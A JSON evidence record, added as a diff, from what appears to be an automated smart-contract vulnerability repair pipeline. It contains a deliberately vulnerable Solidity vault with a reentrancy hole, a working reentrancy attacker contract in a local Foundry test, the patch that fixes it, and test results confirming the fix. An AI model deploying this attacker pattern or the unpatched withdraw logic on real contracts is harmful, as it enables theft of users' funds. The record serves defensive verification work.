@@ -1,0 +1,401 @@
+{
+  "artifact_sha256": {
+    "foundry.toml": "9eb031154b7b0a3c0bb0c8114057108c00b4d8dca8e34c0808697307471f77dc",
+    "original.sol": "77ac754f1b66488bf6ffc004160a5da0af543e17f1e8024ce161faf0d9637520",
+    "repair.diff": "d1c4e425f21c17f2dca54f05da24cdc98106eceb16f8e8187452e2a16d6ab1fe",
+    "src/VulnerableVault.sol": "a18a55ac7d7cd518c831dbd130a29b93fe1fc38265dea5a25b12ed6dde691186",
+    "test/Exploit_heuristic-reentrancy.t.sol": "940093d6c2b6c4eb7fcbe07f92defe5c86e7e54799076e5d44957f86755c55ad",
+    "test/Functional.t.sol": "0a4ebc2b9dafdc9d5e01b7e1f7f544b642badeed3fcb4b086eda7abb5bdca535",
+    "test/Security.t.sol": "f270655638de0181f84ad44d9214061c9bbe7ed485ef234099424ec0853e98ed",
+    "test/SentinelExploit_bf055fc5aa702b2a.t.sol": "b7bf249a692e79424aa45e5e5222cfb37e1d7cef428fd7fd8842d07961e8244c",
+    "test/Vault.t.sol": "01e44b93f663be9a02dd284ee67c8e3782c48a440cd328f827321b678fd60fe6"
+  },
+  "audit_passed": true,
+  "case_id": "reentrancy",
+  "cohort": "existing_demonstration_fixture",
+  "confirmed": true,
+  "controls": [
+    {
+      "accepted": false,
+      "judge": {
+        "abi_compatible": null,
+        "additional_checks": [],
+        "build_passed": false,
+        "evidence_version": 0,
+        "exploit_neutralized": false,
+        "failure_reason": "missing or changed baseline evidence",
+        "feedback": "A reviewed, unchanged exploit oracle, confirmed baseline, nonempty passing regression suite, and actual source patch are required.",
+        "positive_tests_passed": null,
+        "regression_passed": false,
+        "security_tests_passed": null,
+        "storage_layout_compatible": null,
+        "verified": false
+      },
+      "name": "unchanged_patch",
+      "rejected_for_expected_reason": true,
+      "state": "human_review_required",
+      "synthetic_result_injection": false
+    },
+    {
+      "accepted": false,
+      "judge": {
+        "abi_compatible": null,
+        "additional_checks": [],
+        "build_passed": false,
+        "evidence_version": 0,
+        "exploit_neutralized": false,
+        "failure_reason": "missing or changed baseline evidence",
+        "feedback": "A reviewed, unchanged exploit oracle, confirmed baseline, nonempty passing regression suite, and actual source patch are required.",
+        "positive_tests_passed": null,
+        "regression_passed": false,
+        "security_tests_passed": null,
+        "storage_layout_compatible": null,
+        "verified": false
+      },
+      "name": "altered_oracle",
+      "rejected_for_expected_reason": true,
+      "state": "human_review_required",
+      "synthetic_result_injection": false
+    },
+    {
+      "accepted": false,
+      "judge": {
+        "abi_compatible": null,
+        "additional_checks": [],
+        "build_passed": false,
+        "evidence_version": 0,
+        "exploit_neutralized": false,
+        "failure_reason": "missing or changed baseline evidence",
+        "feedback": "A reviewed, unchanged exploit oracle, confirmed baseline, nonempty passing regression suite, and actual source patch are required.",
+        "positive_tests_passed": null,
+        "regression_passed": false,
+        "security_tests_passed": null,
+        "storage_layout_compatible": null,
+        "verified": false
+      },
+      "name": "missing_regression",
+      "rejected_for_expected_reason": true,
+      "state": "human_review_required",
+      "synthetic_result_injection": false
+    },
+    {
+      "accepted": false,
+      "judge": {
+        "abi_compatible": null,
+        "additional_checks": [],
+        "build_passed": false,
+        "evidence_version": 0,
+        "exploit_neutralized": false,
+        "failure_reason": "missing or changed baseline evidence",
+        "feedback": "A reviewed, unchanged exploit oracle, confirmed baseline, nonempty passing regression suite, and actual source patch are required.",
+        "positive_tests_passed": null,
+        "regression_passed": false,
+        "security_tests_passed": null,
+        "storage_layout_compatible": null,
+        "verified": false
+      },
+      "name": "empty_regression",
+      "rejected_for_expected_reason": true,
+      "state": "human_review_required",
+      "synthetic_result_injection": true
+    },
+    {
+      "accepted": false,
+      "judge": {
+        "abi_compatible": null,
+        "additional_checks": [],
+        "build_passed": false,
+        "evidence_version": 0,
+        "exploit_neutralized": false,
+        "failure_reason": "forge build failed",
+        "feedback": "Error: Compiler run failed:\nError (2314): Expected identifier but got '{'\n  --> src/VulnerableVault.sol:19:10:\n   |\n19 | contract {\n   |          ^\n",
+        "positive_tests_passed": null,
+        "regression_passed": false,
+        "security_tests_passed": null,
+        "storage_layout_compatible": null,
+        "verified": false
+      },
+      "name": "invalid_patch",
+      "rejected_for_expected_reason": true,
+      "state": "retry_required",
+      "synthetic_result_injection": false
+    }
+  ],
+  "error": null,
+  "functional_passed": true,
+  "repair_verified": true,
+  "runtime_state": {
+    "aderyn_result": null,
+    "alerts": [],
+    "analyzer_runs": [],
+    "ast_context": {},
+    "baseline_exploit_result": {
+      "command": [
+        "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+        "test",
+        "--json",
+        "--match-test",
+        "^testExploit\\(.*\\)$",
+        "--match-path",
+        "test/SentinelExploit_bf055fc5aa702b2a.t.sol",
+        "--use",
+        "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+        "--offline",
+        "--threads",
+        "1"
+      ],
+      "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy",
+      "duration_seconds": 0.1461959590000106,
+      "exit_code": 0,
+      "stderr": "",
+      "stdout": "{\"test/SentinelExploit_bf055fc5aa702b2a.t.sol:ExploitTest\":{\"duration\":\"1ms 393\u00b5s\",\"test_results\":{\"testExploit()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":85471}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"187\u00b5s 750ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+      "success": true,
+      "timed_out": false
+    },
+    "baseline_regression_result": {
+      "command": [
+        "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+        "test",
+        "--json",
+        "--no-match-test",
+        "^testExploit\\(.*\\)$",
+        "--use",
+        "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+        "--offline",
+        "--threads",
+        "1"
+      ],
+      "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy",
+      "duration_seconds": 0.12328529100000196,
+      "exit_code": 0,
+      "stderr": "",
+      "stdout": "{\"test/Functional.t.sol:FunctionalTest\":{\"duration\":\"355\u00b5s 291ns\",\"test_results\":{\"testFunctional()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":127103}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"183\u00b5s 875ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]},\"test/Vault.t.sol:VaultTest\":{\"duration\":\"105\u00b5s 41ns\",\"test_results\":{\"testDepositAndWithdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":88269}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"37\u00b5s 167ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+      "success": true,
+      "timed_out": false
+    },
+    "candidate_id": "heuristic-reentrancy",
+    "compilation_result": {
+      "command": [
+        "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+        "build",
+        "--use",
+        "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+        "--offline",
+        "--threads",
+        "1"
+      ],
+      "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy",
+      "duration_seconds": 0.08665112500000305,
+      "exit_code": 0,
+      "stderr": "",
+      "stdout": "Compiling 2 files with Solc 0.8.20\nSolc 0.8.20 finished in 18.40ms\nCompiler run successful!\n",
+      "success": true,
+      "timed_out": false
+    },
+    "compiler_info": {},
+    "enabled_analyzers": [
+      "slither",
+      "mythril"
+    ],
+    "experiment_profile": "sentinel-full",
+    "exploit_artifact": {
+      "confirmed": true,
+      "execution": {
+        "command": [
+          "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+          "test",
+          "--json",
+          "--match-test",
+          "^testExploit\\(.*\\)$",
+          "--match-path",
+          "test/SentinelExploit_bf055fc5aa702b2a.t.sol",
+          "--use",
+          "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+          "--offline",
+          "--threads",
+          "1"
+        ],
+        "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy",
+        "duration_seconds": 0.1461959590000106,
+        "exit_code": 0,
+        "stderr": "",
+        "stdout": "{\"test/SentinelExploit_bf055fc5aa702b2a.t.sol:ExploitTest\":{\"duration\":\"1ms 393\u00b5s\",\"test_results\":{\"testExploit()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":85471}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"187\u00b5s 750ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+        "success": true,
+        "timed_out": false
+      },
+      "origin": "reviewed_fixture",
+      "rationale": "The PoC is restricted to the target Foundry project and testExploit.",
+      "source": "pragma solidity ^0.8.20;\n\nimport \"../src/VulnerableVault.sol\";\n\ninterface Vm { function deal(address account, uint256 newBalance) external; }\n\ncontract ReentrancyAttacker {\n    VulnerableVault private immutable vault;\n    uint256 private entered;\n    constructor(VulnerableVault target) { vault = target; }\n    function attack() external payable { vault.deposit{value: msg.value}(); vault.withdraw(); }\n    receive() external payable {\n        if (entered == 0 && address(vault).balance >= 1 ether) {\n            entered = 1;\n            vault.withdraw();\n        }\n    }\n}\n\ncontract ExploitTest {\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    VulnerableVault private vault;\n    ReentrancyAttacker private attacker;\n    function setUp() public {\n        vm.deal(address(this), 2 ether);\n        vault = new VulnerableVault();\n        vault.deposit{value: 1 ether}();\n        attacker = new ReentrancyAttacker(vault);\n    }\n    function testExploit() public {\n        attacker.attack{value: 1 ether}();\n        require(address(attacker).balance == 2 ether, \"reentrancy did not drain victim funds\");\n    }\n}\n",
+      "test_file": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy/test/SentinelExploit_bf055fc5aa702b2a.t.sol",
+      "test_name": "testExploit",
+      "vulnerability_id": "heuristic-reentrancy"
+    },
+    "exploit_confirmed": true,
+    "exploit_result": {
+      "command": [
+        "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+        "test",
+        "--json",
+        "--match-test",
+        "^testExploit\\(.*\\)$",
+        "--match-path",
+        "test/SentinelExploit_bf055fc5aa702b2a.t.sol",
+        "--use",
+        "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+        "--offline",
+        "--threads",
+        "1"
+      ],
+      "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy",
+      "duration_seconds": 0.07162691600001381,
+      "exit_code": 1,
+      "stderr": "",
+      "stdout": "{\"test/SentinelExploit_bf055fc5aa702b2a.t.sol:ExploitTest\":{\"duration\":\"431\u00b5s 42ns\",\"test_results\":{\"testExploit()\":{\"status\":\"Failure\",\"reason\":\"reentrancy did not drain victim funds\",\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":97413}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"85\u00b5s 333ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+      "success": false,
+      "timed_out": false
+    },
+    "exploit_source": "pragma solidity ^0.8.20;\n\nimport \"../src/VulnerableVault.sol\";\n\ninterface Vm { function deal(address account, uint256 newBalance) external; }\n\ncontract ReentrancyAttacker {\n    VulnerableVault private immutable vault;\n    uint256 private entered;\n    constructor(VulnerableVault target) { vault = target; }\n    function attack() external payable { vault.deposit{value: msg.value}(); vault.withdraw(); }\n    receive() external payable {\n        if (entered == 0 && address(vault).balance >= 1 ether) {\n            entered = 1;\n            vault.withdraw();\n        }\n    }\n}\n\ncontract ExploitTest {\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    VulnerableVault private vault;\n    ReentrancyAttacker private attacker;\n    function setUp() public {\n        vm.deal(address(this), 2 ether);\n        vault = new VulnerableVault();\n        vault.deposit{value: 1 ether}();\n        attacker = new ReentrancyAttacker(vault);\n    }\n    function testExploit() public {\n        attacker.attack{value: 1 ether}();\n        require(address(attacker).balance == 2 ether, \"reentrancy did not drain victim funds\");\n    }\n}\n",
+    "feedback": [],
+    "final_report_path": null,
+    "final_verification_state": "verified",
+    "findings": [
+      {
+        "confidence": "unknown",
+        "confidence_score": 0.0,
+        "contract": "",
+        "description": "Existing local demonstration, not a new discovery",
+        "detector": "reviewed-fixture",
+        "evidence": [],
+        "file": "src/VulnerableVault.sol",
+        "function": "",
+        "id": "heuristic-reentrancy",
+        "line": null,
+        "raw_output": "",
+        "semantic_context": "",
+        "severity": "unknown",
+        "source": "local-heuristic",
+        "sources": [],
+        "status": "confirmed"
+      }
+    ],
+    "gas_metrics": {},
+    "judge_result": {
+      "abi_compatible": null,
+      "additional_checks": [],
+      "build_passed": true,
+      "evidence_version": 1,
+      "exploit_neutralized": true,
+      "failure_reason": "",
+      "feedback": "{\"test/SentinelExploit_bf055fc5aa702b2a.t.sol:ExploitTest\":{\"duration\":\"431\u00b5s 42ns\",\"test_results\":{\"testExploit()\":{\"status\":\"Failure\",\"reason\":\"reentrancy did not drain victim funds\",\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":97413}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"85\u00b5s 333ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n{\"test/Functional.t.sol:FunctionalTest\":{\"duration\":\"328\u00b5s 208ns\",\"test_results\":{\"testFunctional()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":127103}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"165\u00b5s 209ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]},\"test/Vault.t.sol:VaultTest\":{\"duration\":\"108\u00b5s 833ns\",\"test_results\":{\"testDepositAndWithdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":88269}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"37\u00b5s 500ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+      "positive_tests_passed": null,
+      "regression_passed": true,
+      "security_tests_passed": null,
+      "storage_layout_compatible": null,
+      "verified": true
+    },
+    "max_retries": 5,
+    "mock_mode": false,
+    "mythril_results": [],
+    "natspec_context": {},
+    "novelty_assessment": {},
+    "oracle_test_hashes": {
+      "test/Exploit_heuristic-reentrancy.t.sol": "940093d6c2b6c4eb7fcbe07f92defe5c86e7e54799076e5d44957f86755c55ad",
+      "test/Functional.t.sol": "0a4ebc2b9dafdc9d5e01b7e1f7f544b642badeed3fcb4b086eda7abb5bdca535",
+      "test/SentinelExploit_bf055fc5aa702b2a.t.sol": "b7bf249a692e79424aa45e5e5222cfb37e1d7cef428fd7fd8842d07961e8244c",
+      "test/Vault.t.sol": "01e44b93f663be9a02dd284ee67c8e3782c48a440cd328f827321b678fd60fe6"
+    },
+    "original_source": {
+      "src/VulnerableVault.sol": "pragma solidity ^0.8.20;\n\n/// @notice Deliberately vulnerable local demonstration contract.\ncontract VulnerableVault {\n    mapping(address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        (bool sent,) = msg.sender.call{value: amount}(\"\"); // reentrancy demo\n        require(sent, \"send failed\");\n        balances[msg.sender] = 0;\n    }\n}\n"
+    },
+    "patch_artifact": {
+      "attempt": 1,
+      "modified_lines": [],
+      "original_file": "src/VulnerableVault.sol",
+      "patch": "--- src/VulnerableVault.sol\n+++ src/VulnerableVault.sol\n@@ -10,8 +10,8 @@\n \n     function withdraw() external {\n         uint256 amount = balances[msg.sender];\n+        balances[msg.sender] = 0;\n         (bool sent,) = msg.sender.call{value: amount}(\"\"); // reentrancy demo\n         require(sent, \"send failed\");\n-        balances[msg.sender] = 0;\n     }\n }\n",
+      "rationale": "Only the vulnerable state-update/authorization region was changed.",
+      "vulnerability_id": "heuristic-reentrancy"
+    },
+    "patch_diff": "--- src/VulnerableVault.sol\n+++ src/VulnerableVault.sol\n@@ -10,8 +10,8 @@\n \n     function withdraw() external {\n         uint256 amount = balances[msg.sender];\n+        balances[msg.sender] = 0;\n         (bool sent,) = msg.sender.call{value: amount}(\"\"); // reentrancy demo\n         require(sent, \"send failed\");\n-        balances[msg.sender] = 0;\n     }\n }\n",
+    "patched_source": {
+      "src/VulnerableVault.sol": "pragma solidity ^0.8.20;\n\n/// @notice Deliberately vulnerable local demonstration contract.\ncontract VulnerableVault {\n    mapping(address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n        (bool sent,) = msg.sender.call{value: amount}(\"\"); // reentrancy demo\n        require(sent, \"send failed\");\n    }\n}\n"
+    },
+    "project_path": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy",
+    "protocol_map": {},
+    "regression_result": {
+      "command": [
+        "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+        "test",
+        "--json",
+        "--no-match-test",
+        "^testExploit\\(.*\\)$",
+        "--use",
+        "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+        "--offline",
+        "--threads",
+        "1"
+      ],
+      "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy",
+      "duration_seconds": 0.07044195900004979,
+      "exit_code": 0,
+      "stderr": "",
+      "stdout": "{\"test/Functional.t.sol:FunctionalTest\":{\"duration\":\"328\u00b5s 208ns\",\"test_results\":{\"testFunctional()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":127103}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"165\u00b5s 209ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]},\"test/Vault.t.sol:VaultTest\":{\"duration\":\"108\u00b5s 833ns\",\"test_results\":{\"testDepositAndWithdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":88269}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"37\u00b5s 500ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+      "success": true,
+      "timed_out": false
+    },
+    "report_artifacts": [],
+    "reproducibility": {},
+    "retry_count": 0,
+    "retry_history": [],
+    "risk_assessment": {},
+    "scout_only": false,
+    "scout_results": [],
+    "slither_result": null,
+    "source_files": [
+      "src/VulnerableVault.sol"
+    ],
+    "workspace_path": null
+  },
+  "security_after": {
+    "command": [
+      "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+      "test",
+      "--json",
+      "--match-test",
+      "^testSecurity\\(.*\\)$",
+      "--use",
+      "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+      "--offline",
+      "--threads",
+      "1"
+    ],
+    "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy",
+    "duration_seconds": 0.10885725000002822,
+    "exit_code": 0,
+    "stderr": "",
+    "stdout": "{\"test/Security.t.sol:SecurityTest\":{\"duration\":\"372\u00b5s 958ns\",\"test_results\":{\"testSecurity()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":355921}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"206\u00b5s 958ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+    "success": true,
+    "timed_out": false
+  },
+  "security_before": {
+    "command": [
+      "/Users/dev/.foundry/versions/foundry-rs/foundry/v1.8.3/forge",
+      "test",
+      "--json",
+      "--match-test",
+      "^testSecurity\\(.*\\)$",
+      "--use",
+      "/Users/dev/.solc-select/artifacts/solc-0.8.20/solc-0.8.20",
+      "--offline",
+      "--threads",
+      "1"
+    ],
+    "cwd": "/private/var/folders/5q/wytk6ysd6f7dxjmvwn0hqj180000gn/T/sentinel-evidence-jilxy3vt/reentrancy",
+    "duration_seconds": 0.30443787499996233,
+    "exit_code": 1,
+    "stderr": "",
+    "stdout": "{\"test/Security.t.sol:SecurityTest\":{\"duration\":\"470\u00b5s 542ns\",\"test_results\":{\"testSecurity()\":{\"status\":\"Failure\",\"reason\":\"victim funds stolen\",\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":373821}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"263\u00b5s\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n",
+    "success": false,
+    "timed_out": false
+  },
+  "security_transition": true
+}
